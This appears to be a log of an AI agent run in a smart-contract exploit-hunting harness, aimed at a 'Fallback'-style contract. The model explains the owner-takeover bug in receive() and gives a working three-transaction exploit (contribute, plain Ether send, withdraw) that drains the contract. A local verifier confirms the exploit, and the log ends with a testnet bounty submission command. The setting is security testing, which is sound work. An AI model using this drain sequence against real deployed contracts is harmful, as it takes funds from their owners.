# Hunter agent run — fallback — muse-wonder-1.0-low (cmd) — 2026-11-01

## Turn 1 — model reply (verbatim)

The bug is that `receive()` changes `owner` to any caller who already has a positive contribution, without checking the amount sent. First making a small `contribute()` call, then sending Ether with empty calldata to trigger `receive()`, makes the player owner so `withdraw()` drains the contract.

```json
[
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0xd7bb99ba", "value": "100000000000000"},
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0x", "value": "100000000000000"},
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0x3ccfd60b", "value": "0"}
]
```

### Turn 1 — local verifier (committed verifier.wasm, wasmtime)

```
tx 1: success
tx 2: success
tx 3: success
validateInstance → 1
broken: True
```

**Result: invariant broken on turn 1.**

Next step on testnet (needs a funded hunter account and an open bounty on this invariant):
`python3 scripts/hunter.py --bounty <bounty> --hunter <account> --exploit hunter-agent/fallback-muse-wonder-1.0-low-exploit.json --label agent-fallback --invariant fallback-owner-drained`
